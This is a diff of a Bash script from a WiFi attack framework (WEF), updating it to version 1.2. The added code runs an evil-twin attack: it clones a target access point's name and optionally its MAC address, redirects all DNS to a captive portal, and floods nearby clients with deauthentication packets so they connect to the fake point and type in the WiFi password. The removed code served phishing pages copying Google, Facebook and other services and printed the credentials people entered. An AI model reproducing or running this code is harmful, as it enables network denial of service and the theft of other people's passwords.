+    arp_out=$(arp -i ${evilCard} | grep "${evilCard}" | awk '{print $1}')
+    arp_len=$(echo ${arp_out} | wc -l)
+    echo -e "${blueC}[${yC}*${blueC}] EvilTwin${2}${endC}"
+    echo -e "${blueC}------------${endC}"
+
+    if [ "$lang" == "en" ]; then
+      if [[ $arp_len == 1 ]] && [ ! "$arp_out" ]; then
+        echo -e "${blueC}Total devices: ${yC}0${endC}"
+      else
+        echo -e "${blueC}Total devices: ${yC}${arp_len}${endC}"
+      fi
+    else
+      if [[ $arp_len == 1 ]] && [ ! "$arp_out" ]; then
+        echo -e "${blueC}Dispositivos totales: ${yC}0${endC}"
+      else
+        echo -e "${blueC}Dispositivos totales: ${yC}${arp_len}${endC}"
+      fi
+    fi
+
+    if [[ $arp_len != 0 ]] && [ "${arp_out}" ]; then
+
+      if [ "$lang" == "en" ]; then
+        echo -e "${blueC}Devices info:${endC}"
+      else
+        echo -e "${blueC}Información sobre los dispositivos:${endC}"
+      fi
+
+      echo -e "${arp_out}"
+    fi
+
+    if [ -f "/tmp/www/ag.et_currentpass.txt" ]; then
+      if [ "$lang" == "en" ]; then
+        echo -e "\n${blueC}Last password tried: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
+      else
+        echo -e "\n${blueC}Ultima contraseña probada: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}"
+      fi
+    fi
+
+    if [ -f "/tmp/www/ag.et_success.txt" ]; then
+      if [ "$lang" == "en" ]; then
+        echo -e "\n${blueC}[${greenC}+${blueC}] Correct password: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}${endC}"
+      else
+        echo -e "\n${blueC}[${greenC}+${blueC}] Contraseña correcta: ${grayC}$(cat /tmp/www/ag.et_currentpass.txt)${endC}${endC}"
+      fi
+      sleep 5
+      break
+    fi
+
+    sleep 1; clear
+  done
+}
+
+# Evil Twin: 1º Hostapd --> 2º Dnsmasq --> 3º Lighttpd --> 4º Deauth (optional)
 function evilTwin(){
-  clear; banner4 ; sleep 0.4; trap evil_c INT
+  clear
+  check_ap_list
+  log_back_to_menu
 
-  echo
-  color_output_ln "*" "Configuring adapter for the Evil Twin attack..."
-  back="0"
-
-  airmon-ng stop ${netCard} &>/dev/null; sleep 1.4
-  ifconfig ${evilCard} down; sleep 1.4
-  iwconfig ${evilCard} mode monitor; sleep 1.2
-
-  good_output_ln "+" "Adapter configured successfully\n"
-  fuser -k 53/tcp &>/dev/null; fuser -k 80/tcp &>/dev/null; sleep 0.3
-
-  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
-  if [ "${kill_network_services}" == "true" ]; then
-    airmon-ng check kill &>/dev/null
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Name of AP to supplant: " && read name
+  else
+    color_output_no_line "*" "Nombre del AP a suplantar: " && read name
   fi
-  killall hostapd dnsmasq dhcpd 2>/dev/null
 
-  color_output_no_line "*" "Name of your evil AP: " && read evil_name
-  sleep 0.2; echo
-  color_output_no_line "*" "Channel of your AP: " && read def_channel
+  if [ "$name" == "back" ]; then
+    return
+  fi
+  parse_info
 	
-  if [ "${def_channel}" -lt "15" ]; then 
+  if [ "${channel}" -lt "15" ]; then 
     hw_mode=g # 2.4Ghz
   else
     hw_mode=a # 5Ghz
   fi
 
-  sleep 0.2; echo
-  color_output_no_line "*" "Password for your AP (leave blank for a public network): " && read AP_passw
-  sleep 0.2
-
+  if [ "$lang" == "en" ]; then
+    echo -e "${blueC}\nType of attack:${endC}"
+  else
+    echo -e "${blueC}\nTipo de ataque:${endC}"
+  fi
+  evil_twin_panel
   echo
-  color_output_no_line "*" "Interface to route internet through (default=eth0): " && read interface_to_route
-  if [ ! "${interface_to_route}" ]; then
-    interface_to_route="eth0"
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Select an option >> " && read evil_option
+  else
+    color_output_no_line "*" "Selecciona una opción >> " && read evil_option
   fi
 
-  progress_bar 2 0.2 "+" "Creating malicious AP"
-  ifconfig $evilCard up; sleep 0.3
+  if [ "$evil_option" == "back" ]; then
+    return
+  fi
+
+  echo
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "A handshake containing target AP handshake is needed to check if provided password is correct, do you want to continue [${yC}y${blueC}/${yC}n${blueC}]: " && read h_continue
+  else
+    color_output_no_line "*" "Se necesita un archivo con el handshake del AP objetivo para comprobar si la contraseña es correcta, quieres continuar [${yC}s${blueC}/${yC}n${blueC}]: " && read h_continue
+  fi
+
+  if [ "$h_continue" != "y" ] && [ "$h_continue" != "yes" ] && [ "$h_continue" != "s" ] && [ "$h_continue" != "si" ]; then
+    return
+  fi
+
+  while true; do
+    if [ "$lang" == "en" ]; then
+      color_output_no_line "*" "Enter path to handshake file: " && read handshake_cap
+    else
+      color_output_no_line "*" "Introduce la ruta del archivo de handshake: " && read handshake_cap
+    fi
+
+    cap_name="${handshake_cap}"
+    if [ "${handshake_cap}" == "back" ]; then
+      return
+    elif [ -f "${handshake_cap}" ]; then
+      if [ "$(check_handshakes_in_file)" -gt "0" ]; then
+        break
+      else
+        if [ "$lang" == "en" ]; then
+          color_output "X" "File doesn't contains any handshake"
+        else
+          color_output "X" "El archivo no contiene ningún handshake"
+        fi
+      fi
+    else
+      if [ "$lang" == "en" ]; then
+        color_output "X" "File doesn't exists"
+      else
+        color_output "X" "El archivo no existe"
+      fi
+    fi
+  done
+
+  if [ "$lang" == "en" ]; then
+    color_output_no_line "*" "Do you want to spoof ${name} BSSID? [${yC}y${blueC}/${yC}n${blueC}]: " && read mac_spoof
+  else
+    color_output_no_line "*" "Quieres suplantar la BSSID de ${name} [${yC}s${blueC}/${yC}n${blueC}]: " && read mac_spoof
+  fi
+
+  check_and_create "/tmp/www"
+  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
+
+    if [ "$lang" == "en" ]; then
+      if [ "$(check_vif)" ]; then
+        good_output "+" "Your network interface seems to support VIF"
+      else
+        color_output "*" "Your network interface doesn't seem to support VIF"
+      fi
+      color_output_no_line "*" "To perform the DoS attack while the AP is running, physical card must be split into 2 cards (Virtual Interface). Do you want to continue? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read vif_check
+    else
+      if [ "$(check_vif)" ]; then
+        good_output "+" "Tu interfaz de red parece soportar VIF"
+      else
+        color_output "*" "Tu interfaz de red no parece soportar VIF"
+      fi
+      color_output_no_line "*" "Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). Quieres continuar? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read vif_check
+    fi
+
+    if [ "$vif_check" == "n" ] || [ "$vif_check" == "no" ] || [ "$vif_check" == "back" ]; then
+      if [ "$lang" == "en" ]; then
+        echo -e "${blueC}Going back to menu...${endC}"; sleep 0.5
+      else
+        echo -e "${blueC}Volviendo al menu...${endC}"; sleep 0.5
+      fi
+      return
+    fi
+  fi
+
+  trap keep_exit_eviltwin INT
+  if [ "$lang" == "en" ]; then
+    color_output_ln "*" "Configuring interface..."
+  else
+    color_output_ln "*" "Configurando la interfaz..."
+  fi
+
+  # Strange workaround for some interface errors & monitor mode
+  airmon-ng stop ${netCard} &>/dev/null; sleep 0.1
+  setup_interface_eviltwin
+
+  if [ "$lang" == "en" ]; then
+    good_output "+" "Interface configured successfully"
+  else
+    good_output "+" "Interfaz configurada correctamente"
+  fi
+
+  systemctl stop systemd-resolved &>/dev/null
+  fuser -k 80/tcp &>/dev/null; sleep 0.1
+
+  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
+  if [ "${kill_network_services}" == "true" ]; then
+    airmon-ng check kill &>/dev/null
+  fi
+
+  killall hostapd hostapd-wpe dnsmasq lighttpd xterm dhcpd 2>/dev/null # Kill processes
+  rm /opt/wef/cache/hostapd.conf 2>/dev/null
+  rm /opt/wef/cache/dnsmasq.conf 2>/dev/null
+  rm /opt/wef/cache/lighttpd.conf 2>/dev/null
+
+  while true; do
+    languages=$(ls /opt/wef/main/captive-portals | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)
+    if [ "$lang" == "en" ]; then
+      echo -e "\n${blueC}Languages:${grayC} ${languages}${endC}"
+      color_output_no_line "*" "Select captive portal language you want to use, enter country code (i.e. pt): " && read country_code
+    else
+      echo -e "\n${blueC}Idiomas:${grayC} ${languages}${endC}"
+      color_output_no_line "*" "Selecciona el idioma del portal cautivo a usar, introduce el codigo del país (i.e. pt): " && read country_code
+    fi
+
+    if [ "$country_code" == "back" ]; then
+      return
+    fi
+
+    if [ "$(echo "${languages}" | grep "${country_code}")" ]; then
+      break
+    else
+      if [ "$lang" == "en" ]; then
+        color_output_ln "X" "Invalid option!"; sleep 0.1
+      else
+        color_output_ln "X" "Opción inválida!"; sleep 0.1
+      fi
+    fi
+  done
+
+  portal_path="/opt/wef/main/captive-portals/${country_code}-portal"
+  create_lighttpd_conf
+  create_template
+
+  ifconfig $evilCard up
+  kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
+
+  if [ "$lang" == "en" ]; then
+    press_enter "Some windows will be open, don't close them. Press Enter to continue and launch attack "
+  else
+    press_enter "Algunas ventanas se abrirán, no las cierres. Presiona Enter para continuar y lanzar el ataque "
+  fi
+
+  sleep 3
 
   # Creating hostapd configuration file
-  rm /opt/wef/cache/hostapd.conf >/dev/null 2>&1
   echo "
 interface=${evilCard}
-ssid=${evil_name}
+ssid=${name}
 hw_mode=${hw_mode}
-channel=${def_channel}
+channel=${channel}
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
@@ -1242,20 +2594,28 @@ ieee80211n=1
 wme_enabled=1
 driver=nl80211" >> /opt/wef/cache/hostapd.conf
 
-  if [ "${AP_passw}" != "" ]; then
-    echo "
-wpa=2
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP
-rsn_pairwise=CCMP
-wpa_passphrase=${AP_passw}" >> /opt/wef/cache/hostapd.conf
+  # Hostapd
+  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
+    if [ "${kill_network_services}" == "true" ]; then
+      # No headless
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -e "hostapd /opt/wef/cache/hostapd.conf" 2>/dev/null &
+    else
+      # Headless
+      hostapd /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &
+    fi
+  elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
+    if [ "${kill_network_services}" == "true" ]; then
+      # No headless
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -e "hostapd-wpe /opt/wef/cache/hostapd.conf" 2>/dev/null &
+    else
+      # Headless
+      hostapd-wpe /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &
+    fi
   fi
 
-  hostapd /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &
+  sleep 5
 
-  sleep 1
   # Creating dnsmasq configuration file
-  rm /opt/wef/cache/dnsmasq.conf >/dev/null 2>&1
   echo "
 interface=${evilCard}
 dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
@@ -1268,235 +2628,99 @@ listen-address=10.0.221.1
 address=/#/10.0.221.1" >> /opt/wef/cache/dnsmasq.conf
 
   ifconfig ${evilCard} 10.0.221.1 netmask 255.255.255.0
-  sleep 0.5
   route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1
 
-  dnsmasq -C /opt/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
-
-  iptables -t nat -A POSTROUTING -o ${interface_to_route} -j MASQUERADE
-  iptables -A FORWARD -i ${interface_to_route} -o ${evilCard} -m state --state RELATED,ESTABLISHED -j ACCEPT 
-  iptables -A FORWARD -i ${evilCard} -o ${interface_to_route} -j ACCEPT
-
-  echo 1 > /proc/sys/net/ipv4/ip_forward
-
-  templates=$(ls /opt/wef/main/templates | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' 2>/dev/null)
-  color_output_ln "WEF" "Templates: ${templates}"; sleep 0.1
-  echo -e "${blueC}You can use a custom template by adding the content to /opt/wef/main/templates/template-name/${endC}\n"; sleep 0.1
-  color_output_no_line "WEF" "Template to use (default: google): " && read template_name
-  upper_name=$(echo "${template_name}" | sed 's/.*/\u&/')
-
-  if [ ! "$template_name" ]; then
-    template_name="google"
-  fi
-
-  sleep 0.3; pushd "/opt/wef/main/templates/${template_name}" > /dev/null 2>&1
-
-  php -S 10.0.221.1:80 > /dev/null 2>&1 &
-
-  sleep 0.1; popd > /dev/null 2>&1
-  good_output_ln "+" "Evil Twin attack deployed successfully"; sleep 4
-  total_devices="0"; clear
-
-  while true; do
-    if [ "$back" == "1" ]; then # Add this check at the beggining of the loop to speed next iteration checks
-      break
-    fi
-
-    good_output "+" "Press Ctrl + C to cancel the attack"
-
-    if [ "${template_name}" == "starbucks" ] || [ "${template_name}" == "google" ] || [ "${template_name}" == "facebook" ] || [ "${template_name}" == "twitter" ] || [ "${template_name}" == "yahoo" ] || [ "${template_name}" == "optimum" ]; then
-      creds_content=$(cat "/opt/wef/main/templates/${template_name}/datos-privados.txt" 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-    elif [ "${template_name}" == "spotify" ] || [ "${template_name}" == "netflix" ] || [ "${template_name}" == "microsoft" ] || [ "${template_name}" == "linkedin" ] || [ "${template_name}" == "dropbox" ] || [ "${template_name}" == "instagram" ]; then
-      creds_content=$(cat "/opt/wef/main/templates/${template_name}/usernames.txt" 2>/dev/null)
-    else
-      creds_content=$(cat "/opt/wef/main/templates/${template_name}/credentials.txt" 2>/dev/null)
-    fi
-
-    color_output_ln "WEF" "Connected devices: ${endC}${yC}${total_devices}"
-    if [ "${creds_content}" ]; then
-      echo -e "\n${yC}${upper_name}"
-      echo -e "--------"
-      echo -e "${blueC}${creds_content}${endC}"
-    else
-      echo -e "\n${blueC}Credentials not submitted yet${endC}"
-    fi
-
-    rm ip-log.tmp 2>/dev/null
-    for number in $(seq 2 254); do
-      timeout 1 bash -c "ping -c 1 10.0.221.${number}" &>/dev/null && echo -e "10.0.221.${number}" >> ip-log.tmp &
-    done; sleep 4
-
-    if [ -f "ip-log.tmp" ]; then
-      total_devices=$(wc -l ip-log.tmp | awk '{print $1}' 2>/dev/null)
-    fi
-
-    if [ "$back" != "1" ]; then # This check helps to cancel the attack almost in every moment
-      sleep 11; clear
-    fi
-
-  done
-}
-
-# Panel function
-function showPanel(){
-  echo -e "\n${blueC}[${yC}1${blueC}] Beacon Flood Attack\t\t\t[${yC}10${blueC}] Pixie Dust Attack${endC}"
-  echo -e "${blueC}[${yC}2${blueC}] Deauthentication Attack\t\t[${yC}11${blueC}] Caffe-Latte Attack${endC}"
-  echo -e "${blueC}[${yC}3${blueC}] Authentication Attack\t\t[${yC}12${blueC}] ChopChop Attack${endC}"
-  echo -e "${blueC}[${yC}4${blueC}] PMKID Attack\t\t\t[${yC}13${blueC}] Michael Exploitation Attack${endC}"
-  echo -e "${blueC}[${yC}5${blueC}] Passive Attack\t\t\t[${yC}14${blueC}] Replay Attack${endC}"
-  echo -e "${blueC}[${yC}6${blueC}] Randomize MAC address\t\t[${yC}15${blueC}] Null Pin Attack${endC}"
-  echo -e "${blueC}[${yC}7${blueC}] Start network card${endC}"
-  echo -e "${blueC}[${yC}8${blueC}] Evil Twin Attack${endC}"
-  echo -e "${blueC}[${yC}9${blueC}] Attacks info${endC}"
-}
-
-# GPS Spoofing function
-function gps_spoof(){
-  echo -ne "\n${blueC}[${yC}*${blueC}] Starting GPS Spoofing"; sleep 0.3; echo -ne "."; sleep 0.3; echo -ne "."; sleep 0.3; echo -ne ".${endC}"; sleep 0.2
-  /opt/wef/extra/gps-sdr-sim/gps-sdr-sim
-  echo -e "\n${blueC}[${greenC}+${blueC}] Attack completed${endC}"
-}
-
-# Help inside the framework
-function listHelp(){
-  echo -e "\n\t${yC}Command\t\t\tDescription"
-  echo -e "\t-------\t\t\t-----------${endC}"
-  echo -e "${blueC} \tscan\t\t\t- Scan access points during 25s (also refresh AP list)${endC}"
-  echo -e "${blueC} \tlist\t\t\t- List already scanned APs"
-  echo -e "${blueC} \texit/quit\t\t- Exit from the framework${endC}"
-  echo -e "${blueC} \tchipsets\t\t- List the chipsets which supports monitor mode${endC}"
-  #echo -e "${blueC} \tmodules\t\t\t- Show the availables modules${endC}"
-  #echo -e "${blueC} \tload <module_name>\t- Load a different module${endC}"
-  echo -e "${blueC} \thelp/?\t\t\t- Print this help panel${endC}"
-  echo -e "${blueC} \tinhibit <ap_name>\t- Inhibit an AP connections until you press Ctrl + C${endC}"
-  echo -e "${blueC} \textra\t\t\t- Print a list of extra commands and utilities${endC}"
-  echo -e "${blueC} \tinfo\t\t\t- Show info about your network adapter${endC}"
-  echo -e "${blueC} \tverbose\t\t\t- Set verbose on, to see more output${endC}"
-  echo -e "${blueC} \tno verbose\t\t- Set verbose off, to see less output${endC}"
-  echo -e "${blueC} \tdump\t\t\t- Dump credentials submitted in the EvilTwin attack${endC}"
-  echo -e "${blueC} \tenable/disable auto\t- Enable/disable the automatic deletion of the EvilTwin creds every week${endC}"
-  echo -e "${blueC} \tattacks\t\t\t- Show info about the different attacks${endC}"
-  echo -e "${blueC} \tupdate\t\t\t- Check if an update is available and ask you to install it"
-  echo -e "${blueC} \tversion\t\t\t- Print the info about the version of wef${endC}"
-  echo -e "${blueC} \texec\t\t\t- Allow you to execute commands without exiting the program${endC}"
-  echo -e "${blueC} \tpanel\t\t\t- Display attack options panel${endC}"
-  echo -e "${blueC} \tclear/cls\t\t- Clear the screen${endC}"
-}
-
-# AP Scan
-function ap_scan(){
-  echo; timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee scan_output
-  sleep 0.2
-  good_output_ln "+" "Scan completed"
-}
-
-function list_aps(){
-  if [ -f "scan_output" ]; then
-    echo; cat scan_output; sleep 0.2
+  # Dnsmasq
+  if [ "${kill_network_services}" == "true" ]; then
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Dnsmasq" -e "dnsmasq -C /opt/wef/cache/dnsmasq.conf -d" 2>/dev/null &
   else
-    color_output_ln "*" "There is no AP scan!"
+    dnsmasq -C /opt/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
   fi
+
+  sleep 5
+
+  # Deauth
+  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
+    iwconfig mon${evilCard} channel ${channel} 2>/dev/null; sleep 0.1
+    if [ "${kill_network_services}" == "true" ]; then
+      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Deauth" -e "aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_mac} mon${evilCard}" 2>/dev/null &
+    else
+      aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_mac} "mon${evilCard}" > /dev/null 2>&1 &
+    fi
+
+    sleep 4
+  fi
+
+  # Start web server (Lighttpd)
+  if [ "${kill_network_services}" == "true" ]; then
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Lighttpd" -e "lighttpd -D -f /opt/wef/cache/lighttpd.conf" 2>/dev/null &
+  else
+    lighttpd -f /opt/wef/cache/lighttpd.conf > /dev/null 2>&1 &
+  fi
+
+  sleep 4
+
+  export -f check_eviltwin_success # Export function
+  if [ "${kill_network_services}" == "true" ]; then
+    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "EvilTwin" -e "check_eviltwin_success" 2>/dev/null &
+  fi
+
+  if [ "$lang" == "en" ]; then
+    good_output_ln "+" "Evil Twin attack deployed successfully, when correct password is submitted attack will stop immediately"
+    check_eviltwin_password & # This will notify the user is the correct password is provided
+    press_enter "Press Enter to continue and finish attack "
+  else
+    good_output_ln "+" "Ataque Evil Twin desplegado correctamente, cuando se introduzca la contraseña correcta se detendrá el ataque automaticamente"
+    check_eviltwin_password & # This will notify the user is the correct password is provided
+    press_enter "Presiona Enter para continuar y terminar el ataque "
+  fi
+
+  # Attack finish here, restore interface and return to main menu
+  rm -rf "/tmp/www" 2>/dev/null
+  evil_c
+  airmon-ng start "${oldCard}" &>/dev/null
 }
 
-# Dump credentials from EvilTwin Attack
-function dumpCreds(){
-  face=$(cat /opt/wef/main/templates/facebook/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-  yahoo=$(cat /opt/wef/main/templates/yahoo/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-  google=$(cat /opt/wef/main/templates/google/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-  star=$(cat /opt/wef/main/templates/starbucks/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-  optimum=$(cat /opt/wef/main/templates/optimum/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-  insta=$(cat /opt/wef/main/templates/instagram/usernames.txt 2>/dev/null)
-  twitter=$(cat /opt/wef/main/templates/twitter/datos-privados.txt 2>/dev/null | grep -v Array | sed 's/)//g' | sed 's/(//g' | sed 's/^ *//g' 2>/dev/null)
-  link=$(cat /opt/wef/main/templates/linkedin/usernames.txt 2>/dev/null)
-  spotify=$(cat /opt/wef/main/templates/spotify/usernames.txt 2>/dev/null)
-  netflix=$(cat /opt/wef/main/templates/netflix/usernames.txt 2>/dev/null)
-  microsoft=$(cat /opt/wef/main/templates/microsoft/usernames.txt 2>/dev/null)
 
-  creds_counter="0"
 
-  if [ "${google}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Google"
-    echo -e "------"
-    echo -e "${blueC}${google}${endC}"
-  fi
 
-  if [ "${face}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Facebook"
-    echo -e "--------"
-    echo -e "${blueC}${facebook}${endC}"
-  fi
-
-  if [ "${star}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Starbucks"
-    echo -e "---------"
-    echo -e "${blueC}${star}${endC}"
-  fi
-
-  if [ "${yahoo}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Yahoo"
-    echo -e "-----"
-    echo -e "${blueC}${yahoo}${endC}"
-  fi
-
-  if [ "${optimum}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Optimum"
-    echo -e "-------"
-    echo -e "${blueC}${optimum}${endC}"
-  fi
-
-  if [ "${twitter}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Twitter"
-    echo -e "-------"
-    echo -e "${blueC}${twitter}${endC}"
-  fi
-
-  if [ "${insta}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Instagram"
-    echo -e "---------\n"
-    echo -e "${blueC}${insta}${endC}"
-  fi
-
-  if [ "${spotify}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Spotify"
-    echo -e "-------\n"
-    echo -e "${blueC}${spotify}${endC}"
-  fi
-
-  if [ "${link}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Linkedin"
-    echo -e "--------\n"
-    echo -e "${blueC}${link}${endC}"
-  fi
-
-  if [ "${microsoft}" ]; then
-    creds_counter="1"
-    echo -e "\n${yC}Microsoft"
-    echo -e "$---------\n"
-    echo -e "${blueC}${microsoft}${endC}"
-  fi
-
-  if [ "${creds_counter}" == "0" ]; then
-    color_output_ln "X" "No credentials submitted"
-  fi
-}
-
-words=("help" "randomize mac" "attacks" "deauth" "beacon" "deauthentication" "caffe-latte" "authentication" "auth" "pmkid" "pmkid attack" "start card" "pmkid-attack" "beacon-flood" "beaconflood" "michael" "start" "up" "exit" "quit" "salir" "sortir" "1" "2" "3" "4" "5" "6" "7" "8" "9" "10" "11" "12" "13" "14" "15" "16" "evil" "evil-twin" "eviltwin" "chopchop" "replay" "replay attack" "beacon flood" "deauth attack" "deauth-attack" "deauthentication-attack" "evil-twin-attack" "authentication attack" "deauthentication attack" "randomize" "mac" "passive" "passive attack" "stealthy" "stealthy attack" "stealthy-attack" "passive-attack" "randomize-mac" "info" "pixie dust" "pixie" "pixie-dust" "replay-attack" "exec" "command" "execute" "exi" "qui" "chopchop attack" "chopchop-attack" "michael attack" "michael-attack" "wef" "WEF" "modules" "load bluetooth" "load wifi" "clear" "panel" "scan" "chipsets" "adapters" "info" "evil twin" "?" "inhibit" "inhibitor" "cls" "verbose" "noverbose" "Deauthentication" "Authentication" "PMKID" "Beacon" "Beacon Flood" "Michael" "Michael Exploitation" "Passive" "Stealthy" "Start" "Pixie" "Pixie Dust" "PixieDust" "Caffe-Latte" "Caffe Latte" "CaffeLatte" "ChopChop" "Evil" "Evil Twin" "EvilTwin" "Evil-Twin" "Null" "Null Pin" "Replay" "Replay Attack" "Randomize" "version" "null" "enable auto" "enable" "disable auto" "disable" "extra" "update" "gps" "b" "d" "a" "e" "r" "n" "m" "banner")
+#
+# Main workflow starts here
+#
 
 parameters=("$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9")
+export lang="en" # Default language
+
+SHELL="/bin/bash"
+
+config_lang=$(awk -F '=' '/lang/ {print $2}' /opt/wef/wef.cnf)
+if [ "$config_lang" == "en" ]; then
+  lang="en"
+elif [ "$config_lang" == "es" ]; then
+  lang="es"
+fi
+
+use_colors=$(awk -F '=' '/use_colors/ {print $2}' /opt/wef/wef.cnf)
+if [ "$use_colors" == "true" ]; then
+  # Define colors and formats
+  export greenC="\e[0;32m\033[1m"
+  export endC="\033[0m\e[0m"
+  export blueC="\e[0;34m\033[1m"
+  export yC="\e[0;33m\033[1m"
+  export grayC="\e[0;37m\033[1m"
+fi
+
+for parameter in ${parameters[@]}; do
+  if [ "${parameter}" == "-s" ]; then
+    lang="es"
+  fi
+done
 
 # Main Wifi Function
 if [ "$(id -u)" == "0" ]; then
 
-  program_version="1.1"
+  program_version="1.2"
+
   while getopts ":i:" arg; do
     case ${arg} in
       i) netCard=$OPTARG;
@@ -1504,32 +2728,30 @@ if [ "$(id -u)" == "0" ]; then
   done
 
   for parameter in ${parameters[@]}; do
+
     if [ "${parameter}" == "--version" ]; then
-      echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
-      echo -e "Created by D3Ext <d3ext@proton.me>\n"
+      if [ "$lang" == "en" ]; then
+        echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
+        echo -e "Created by D3Ext <d3ext@proton.me>\n"
+      else
+        echo -e "\nwef v${program_version} para linux (https://github.com/D3Ext/WEF)"
+        echo -e "Creado por D3Ext <d3ext@proton.me>\n"
+      fi
       exit 0
     fi
 
     if [ "$parameter" == "-h" ] || [ "$parameter" == "--help" ]; then
-      helpPanel
+      help_panel
       exit 0
     fi
 
-    if [ "$parameter" == "--headless" ]; then
-      headless="1"
-    fi
-
     if [ "$parameter" == "-v" ] || [ "$parameter" == "--verbose" ]; then
-      verbose="1"
+      verbose=1
     fi
   done
 
-  if [ ! "$headless" ]; then
-    headless="0"
-  fi
-
   if [ ! "$verbose" ]; then
-    verbose="0"
+    verbose=0
   fi
 
   if [ ! -d "/opt/wef/main/" ]; then
@@ -1537,7 +2759,11 @@ if [ "$(id -u)" == "0" ]; then
     echo -e " \ \    / / __| __|"
     echo -e "  \ \/\/ /| _|| _| "
     echo -e "   \_/\_/ |___|_|  ${endC}"
-    color_output_ln "WEF" "Please run the setup.sh before using WEF\n"
+    if [ "$lang" == "en" ]; then
+      color_output_ln "WEF" "Please run setup.sh before using WEF\n"
+    else
+      color_output_ln "WEF" "Ejecuta setup.sh antes de usar WEF\n"
+    fi
     exit 0
   fi
 
@@ -1547,6 +2773,8 @@ if [ "$(id -u)" == "0" ]; then
     netCard="$3"
   elif [ "$3" == "--interface" ]; then
     netCard="$4"
+  elif [ "$4" == "--interface" ]; then
+    netCard="$5"
   fi
 
   if [ "$netCard" ]; then
@@ -1555,325 +2783,431 @@ if [ "$(id -u)" == "0" ]; then
       echo -e " \ \    / / __| __|"
       echo -e "  \ \/\/ /| _|| _| "
       echo -e "   \_/\_/ |___|_|  ${endC}"
-      color_output_ln "X" "Interface not found\n"
+      if [ "$lang" == "en" ]; then
+        color_output_ln "X" "Interface not found\n"
+      else
+        color_output_ln "X" "Interfaz no disponible\n"
+      fi
+
       exit 0
     fi
 
-    mon_check=$(check_interface_mode)
-    if [ "${mon_check}" == "monitor" ]; then
-      echo -e "${yC} __      _____ ___ "
-      echo -e " \ \    / / __| __|"
-      echo -e "  \ \/\/ /| _|| _| "
-      echo -e "   \_/\_/ |___|_|  ${endC}"
-      color_output_ln "X" "Interface should be in managed mode\n"
-      exit 0
+    if [ "$(check_interface_mode)" == "monitor" ]; then
+      if [ "$(check_monitor_type)" == "airmon" ]; then
+        oldCard=$(echo "${netCard}" | sed 's/mon//g')
+        evilCard=${oldCard}
+      elif [ "$(check_monitor_type)" == "iwconfig" ]; then
+        oldCard=${netCard}
+        evilCard=${netCard}
+      fi
     fi
 
-    progress_bar 2 1 "*" "Starting framework"
+    echo
+    if [ "$lang" == "en" ]; then
+      progress_bar 2 0.9 "*" "Starting framework"
+      echo -e "\n${blueC}Use the tool only under your responsibility${endC}"; sleep 0.3
+      echo -e "${blueC}${program_version} version${endC}"; sleep 0.3
+      echo -e "${blueC}With <3 by D3Ext${endC}"; sleep 1.3
+    else
+      progress_bar 2 0.9 "*" "Iniciando framework"
